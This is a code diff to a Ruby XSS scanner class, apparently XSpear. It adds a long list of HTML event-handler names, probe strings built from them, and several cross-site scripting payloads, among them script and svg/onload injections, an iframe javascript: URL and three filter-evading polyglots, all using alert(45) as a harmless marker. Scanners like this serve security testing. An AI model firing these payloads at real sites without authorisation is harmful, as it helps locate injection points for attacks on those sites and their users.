@@ -128,9 +128,116 @@ class XspearScan
 
   def run
     r = []
+    event_handler = [
+        'onAbort',
+        'onActivate',
+        'onAfterPrint',
+        'onAfterUpdate',
+        'onBeforeActivate',
+        'onBeforeCopy',
+        'onBeforeCut',
+        'onBeforeDeactivate',
+        'onBeforeEditFocus',
+        'onBeforePaste',
+        'onBeforePrint',
+        'onBeforeUnload',
+        'onBeforeUpdate',
+        'onBegin',
+        'onBlur',
+        'onBounce',
+        'onCellChange',
+        'onChange',
+        'onClick',
+        'onContextMenu',
+        'onControlSelect',
+        'onCopy',
+        'onCut',
+        'onDataAvailable',
+        'onDataSetChanged',
+        'onDataSetComplete',
+        'onDblClick',
+        'onDeactivate',
+        'onDrag',
+        'onDragEnd',
+        'onDragLeave',
+        'onDragEnter',
+        'onDragOver',
+        'onDragDrop',
+        'onDragStart',
+        'onDrop',
+        'onEnd',
+        'onError',
+        'onErrorUpdate',
+        'onFilterChange',
+        'onFinish',
+        'onFocus',
+        'onFocusIn',
+        'onFocusOut',
+        'onHashChange',
+        'onHelp',
+        'onInput',
+        'onKeyDown',
+        'onKeyPress',
+        'onKeyUp',
+        'onLayoutComplete',
+        'onLoad',
+        'onLoseCapture',
+        'onMediaComplete',
+        'onMediaError',
+        'onMessage',
+        'onMouseDown',
+        'onMouseEnter',
+        'onMouseLeave',
+        'onMouseMove',
+        'onMouseOut',
+        'onMouseOver',
+        'onMouseUp',
+        'onMouseWheel',
+        'onMove',
+        'onMoveEnd',
+        'onMoveStart',
+        'onOffline',
+        'onOnline',
+        'onOutOfSync',
+        'onPaste',
+        'onPause',
+        'onPopState',
+        'onProgress',
+        'onPropertyChange',
+        'onReadyStateChange',
+        'onRedo',
+        'onRepeat',
+        'onReset',
+        'onResize',
+        'onResizeEnd',
+        'onResizeStart',
+        'onResume',
+        'onReverse',
+        'onRowsEnter',
+        'onRowExit',
+        'onRowDelete',
+        'onRowInserted',
+        'onScroll',
+        'onSeek',
+        'onSelect',
+        'onSelectionChange',
+        'onSelectStart',
+        'onStart',
+        'onStop',
+        'onStorage',
+        'onSyncRestored',
+        'onSubmit',
+        'onTimeError',
+        'onTrackChange',
+        'onUndo',
+        'onUnload',
+        'onURLFlip'
+    ]
+
     log('s', 'creating a test query.')
     r.push makeQueryPattern('d', 'XsPeaR"', 'XsPeaR"', 'i', "Found SQL Error Pattern", CallbackErrorPatternMatch)
     r.push makeQueryPattern('r', 'rEfe6', 'rEfe6', 'i', 'reflected parameter', CallbackStringMatch)
+    # Check Special Chat
     r.push makeQueryPattern('f', 'XsPeaR>', 'XsPeaR>', 'i', "not filtered "+">".blue, CallbackStringMatch)
     r.push makeQueryPattern('f', '<XsPeaR', '<XsPeaR', 'i', "not filtered "+"<".blue, CallbackStringMatch)
     r.push makeQueryPattern('f', 'XsPeaR"', 'XsPeaR"', 'i', "not filtered "+'"'.blue, CallbackStringMatch)
@@ -151,14 +258,21 @@ class XspearScan
     r.push makeQueryPattern('f', 'XsPeaR-', 'XsPeaR-', 'i', "not filtered "+"-".blue, CallbackStringMatch)
     r.push makeQueryPattern('f', 'XsPeaR=', 'XsPeaR=', 'i', "not filtered "+"=".blue, CallbackStringMatch)
     r.push makeQueryPattern('f', 'XsPeaR$', 'XsPeaR$', 'i', "not filtered "+"$".blue, CallbackStringMatch)
+    # Check Event Handler
+    r.push makeQueryPattern('f', '<xspear/onhwul=64>', 'onhwul=64', 'i', "not filtered event handler "+"on{any} pattern".blue, CallbackStringMatch)
+    event_handler.each do |ev|
+      r.push makeQueryPattern('f', "\"<xspear #{ev}=64>", "#{ev}=64", 'i', "not filtered event handler "+"#{ev}=64".blue, CallbackStringMatch)
+    end
     r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<svg/onload=alert(45)>', '<svg/onload=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
     r.push makeQueryPattern('x', '<img/src onerror=alert(45)>', '<img/src onerror=alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
-    r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'v', "injected "+"<script>alert(45)</script>".red, CallbackXSSSelenium)
-    r.push makeQueryPattern('x', '\'"><svg/onload=alert(45)>', '\'"><svg/onload=alert(45)>', 'v', "injected "+"<svg/onload=alert(45)>".red, CallbackXSSSelenium)
-    r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "running "+"XSS Polyglot payload".red, CallbackXSSSelenium)
-    r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "running "+"XSS Polyglot payload".red, CallbackXSSSelenium)
-    r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "running "+"XSS Polyglot payload".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"><iframe/src=JavaScriPt:alert(45)>', '"><iframe/src=JavaScriPt:alert(45)>', 'h', "reflected "+"XSS Code".red, CallbackStringMatch)
+    r.push makeQueryPattern('x', '"><script>alert(45)</script>', '<script>alert(45)</script>', 'v', "triggered "+"<script>alert(45)</script>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '<xmp><p title="</xmp><svg/onload=alert(45)>">', '<xmp><p title="</xmp><svg/onload=alert(45)>">', 'v', "triggered "+"<xmp><p title='</xmp><svg/onload=alert(45)>'>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '\'"><svg/onload=alert(45)>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"<svg/onload=alert(45)>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(45) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(45)//>\x3e', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', 'javascript:"/*`/*\"/*\' /*</stYle/</titLe/</teXtarEa/</nOscript></Script></noembed></select></template><FRAME/onload=/**/alert(45)//-->&lt;<sVg/onload=alert`45`>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(45)//>', '\'"><svg/onload=alert(45)>', 'v', "triggered "+"XSS Polyglot payload".red, CallbackXSSSelenium)
     r = r.flatten
     r = r.flatten
     log('s', "test query generation is complete. [#{r.length} query]")
